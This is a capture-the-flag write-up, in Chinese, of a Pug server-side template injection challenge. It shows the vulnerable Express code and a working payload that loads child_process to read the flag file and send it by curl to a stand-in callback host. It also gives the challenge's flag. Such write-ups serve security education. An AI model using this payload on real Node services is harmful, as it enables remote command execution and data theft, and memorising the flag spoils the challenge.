# BSidesAlgiers2025 - Mytemplates

## 题目简述

题目是一个表单提交服务，页面使用 Pug 渲染模板。关键端点为：

- `GET /form`：提交页面；
- `POST /submit`：把 `userText` 拼接进模板源码并编译执行；
- `POST /contact-submit`：普通转义输出，非主线。

源码可验证：`/submit` 不仅会把用户输入当模板片段处理，还给模板函数注入了 `global`、`process` 对象，导致 `userText` 可触发原生对象链调用。

该题决定性障碍是：**在可控模板源码上下文中执行服务端命令**（SSTI->RCE）。

## 解题过程

### 关键观察

`/submit` 的关键实现如下：

```javascript
app.post('/submit', (req, res) => {
    const userText = req.body.userText;
    const randomMessage = welcomeMessages[Math.floor(Math.random() * welcomeMessages.length)];

    try {
        const compiledTemplate = pug.compile(`p ${randomMessage} ${userText}`);

        compiledTemplate({ global: global, process: process });
        res.render('index', { message: 'Thanks for your submission!', userText: null });
    } catch (error) {
        res.send('Error in rendering template');
    }
});
```

其中 `pug.compile(...)` 的输入直接拼接了 `userText`，没有任何输入净化。`compiledTemplate` 又接收了 `global/process`，所以可以构造模板表达式调用 `child_process.exec` 执行系统命令。

另外，前端模板还明确注释“这里用 `!{}` 做未转义插值，使 SSTI 成为入口”，进一步说明输入会被当作可执行模板表达式处理。

### 求解步骤（可复现）

1. 打开 `/submit` 提交表单；
2. 使用模板 payload 读取系统文件或执行外部回传；
3. 回传结果即为 flag（`solution/payload.txt` 中给出了可直接执行的模板片段）。

官方 payload 的关键动作是通过 `child_process.exec` 读取随机文件名的 flag，再把标准输入作为 POST 请求体送往攻击者控制的接收端。为避免归档一个失效的临时 webhook，下面用 `CALLBACK_URL` 作为显式替换标记；提交前应将它替换成经过 shell 引号保护、可接收 POST 的实际地址：

```text
!{function(){const localLoad=global.process.mainModule.constructor._load;const childProcess=localLoad("child_process");childProcess.exec('cat /N5e7oijkkf5C_.txt | curl --data-binary @- CALLBACK_URL')}()}
```

`/challenge/flag.txt` 中还提供了本地可验证的 flag（官方题目环境中的完整输出）。官方仓库中的该文件内容为：

`shellamtes{pUG_ISNt_DOg_Jst3MpL4Te_N3ithEr_FR0G}`

注意附件中的前缀确实拼成了 `shellamtes`，这不是本文转写错误；归档时应保留仓库原值，不应擅自“修正”为常见的 `shellmates`。

### 验证

`flag.txt` 为静态可验证值；在未开启远程 webhook 时，可通过 payload 调整为直接读写本地文件与测试端点完成验证。题面目标（拿到 flag）在本地仓库即有闭合证据。

## 方法总结

- 核心技巧：Pug SSTI 直接编译了未经清洗的用户拼接源码，且上下文中暴露了 `global/process`，可直接触发 `child_process`。
- 识别信号：看到 `compile(templateString)`/`render(userInput)` 且未转义或沙箱过滤，优先检查是否能直接执行内置对象链。
- 复用要点：对于模板注入类题，必须在代码层确认“用户输入只参与参数渲染”还是“参与模板源码”；前者通常是输出型 XSS，后者常直接是 SSTI/RCE。
